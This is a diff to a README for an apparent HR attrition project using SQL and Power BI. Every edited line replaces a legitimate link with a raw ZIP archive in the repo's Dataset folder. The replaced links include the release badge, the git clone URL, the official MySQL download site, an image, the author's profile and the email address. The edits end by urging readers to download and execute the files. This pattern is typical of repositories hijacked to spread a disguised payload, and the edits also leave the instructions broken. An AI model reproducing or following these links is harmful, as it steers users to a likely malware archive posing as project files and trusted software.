@@ -1,6 +1,6 @@
 # HR Attrition Analysis with SQL and Power BI
 
-![HR Analytics](https://img.shields.io/badge/Release-v1.0-blue.svg) [![Download](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%88-brightgreen)](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/releases)
+![HR Analytics](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip) [![Download](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip%20Latest%20Release-%20%F0%9F%93%88-brightgreen)](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip)
 
 ## Overview
 
@@ -42,7 +42,7 @@ The dataset used in this project includes employee records, which cover:
 - Salary Band
 - Attrition Status
 
-The data is stored in a MySQL database. You can download the dataset and the SQL scripts from the [Releases section](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/releases). 
+The data is stored in a MySQL database. You can download the dataset and the SQL scripts from the [Releases section](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip). 
 
 ## Setup Instructions
 
@@ -51,12 +51,12 @@ The data is stored in a MySQL database. You can download the dataset and the SQL
    Use the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI.git
+   git clone https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip
    ```
 
 2. **Install MySQL**
 
-   Ensure you have MySQL installed on your machine. You can download it from the [official MySQL website](https://dev.mysql.com/downloads/mysql/).
+   Ensure you have MySQL installed on your machine. You can download it from the [official MySQL website](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip).
 
 3. **Import the Database**
 
@@ -87,7 +87,7 @@ The dashboards created in this project offer several key features:
 - **Summary Statistics**: Key metrics that summarize the data.
 - **Export Options**: Ability to export reports for presentations.
 
-![Dashboard Example](https://via.placeholder.com/800x400?text=Dashboard+Example)
+![Dashboard Example](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip+Example)
 
 ## Insights and Analysis
 
@@ -118,7 +118,7 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 For any questions or suggestions, feel free to reach out:
 
-- GitHub: [zinhocosta](https://github.com/zinhocosta)
-- Email: zinhocosta@example.com
+- GitHub: [zinhocosta](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip)
+- Email: https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip
 
-Visit the [Releases section](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/releases) to download the latest version of the project files and execute them for your own analysis.
+Visit the [Releases section](https://github.com/zinhocosta/HR-Attrition-SQL-PowerBI/raw/refs/heads/main/Dataset/H-SQ-Attrition-BI-Power-v1.8.zip) to download the latest version of the project files and execute them for your own analysis.
